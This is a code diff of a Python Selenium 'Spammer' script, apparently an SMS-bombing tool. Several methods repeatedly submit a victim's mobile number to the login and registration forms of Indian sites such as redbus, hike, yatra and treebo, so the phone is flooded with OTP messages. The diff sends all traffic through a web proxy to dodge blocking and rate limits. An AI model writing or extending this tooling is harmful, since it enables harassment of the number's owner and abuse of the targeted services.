@@ -10,7 +10,7 @@ from threading import Thread
 class Spammer:
 
     chrome_options = Options()
-    path = os.getcwd() + r"\chromedriver.exe"
+    path = os.getcwd() + r"\\chromedriver.exe"
 
     def __init__(self, mobile, count, seconds, headless=False):
         self.mobile_no = mobile
@@ -20,13 +20,43 @@ class Spammer:
         if headless:
             Spammer.chrome_options.add_argument("--headless")
 
-    def redbus_blast(self):
+    def create_driver(self, url):
         driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
-        driver.get("https://www.redbus.in/account?pageName=Home&noReload=noReload")
+        driver.get("https://us.hideproxy.me/")
 
+        self.remove_options(driver)
+
+        url_input = driver.find_element_by_class_name("url-input")
+        url_input.clear()
+        url_input.send_keys(url)
+
+        url_button = driver.find_element_by_class_name("url-button")
+        driver.execute_script("arguments[0].click();", url_button)
+
+        return driver
+
+    def remove_options(self, driver):
+        remove_scripts = driver.find_element_by_id("stripJS")
+        if remove_scripts.get_attribute('checked'):
+            driver.execute_script("arguments[0].click();", remove_scripts)
+
+        remove_objects = driver.find_element_by_id("stripObjects")
+        if remove_objects.get_attribute('checked'):
+            driver.execute_script("arguments[0].click();", remove_objects)
+
+        
+    def redbus_blast(self):
+        driver = self.create_driver("https://www.redbus.in/account")
+
+        print("Spamming...")
         i = 0
         try:
             while self.spam_count < self.bomb_count:
+
+                country_code = driver.find_element_by_id("selectedPhCode")
+                driver.execute_script("arguments[0].setAttribute('data-cntrycode','IND')", country_code)
+                driver.execute_script("arguments[0].innerHTML = arguments[1];", country_code, "+ 91")
+
                 mobile_input = driver.find_element_by_id("mobileNoInp")
                 mobile_input.clear()
                 mobile_input.send_keys(self.mobile_no)
@@ -38,6 +68,8 @@ class Spammer:
                 driver.execute_script("arguments[0].click();", element)
 
                 driver.refresh()
+                self.remove_options(driver)
+
                 self.spam_count += 1
                 i += 1
 
@@ -51,8 +83,7 @@ class Spammer:
             driver.close()
 
     def hike_blast(self):
-        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
-        driver.get("https://hike.in/")
+        driver = self.create_driver("https://hike.in/")
 
         i = 0
         try:
@@ -77,8 +108,7 @@ class Spammer:
             driver.close()
 
     def biryani_blast(self):
-        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
-        driver.get("https://www.behrouzbiryani.com/bb-login")
+        driver = self.create_driver("https://www.behrouzbiryani.com/bb-login")
 
         random_string = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))
         name = random_string
@@ -116,8 +146,7 @@ class Spammer:
             driver.close()
 
     def yatra_blast(self):
-        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
-        driver.get("https://secure.yatra.com/social/common/yatra/register")
+        driver = self.create_driver("https://secure.yatra.com/social/common/yatra/register")
 
         i = 0
         try:
@@ -142,8 +171,7 @@ class Spammer:
             driver.close()
 
     def treebo_blast(self):
-        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
-        driver.get("https://www.treebo.com/login/")
+        driver = self.create_driver("https://www.treebo.com/login/")
 
         i = 0
         try:
@@ -169,8 +197,7 @@ class Spammer:
             driver.close()
 
     def joister_blast(self):
-        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
-        driver.get("https://www.joister.com/")
+        driver = self.create_driver("https://www.joister.com/")
 
         i = 0
         try:
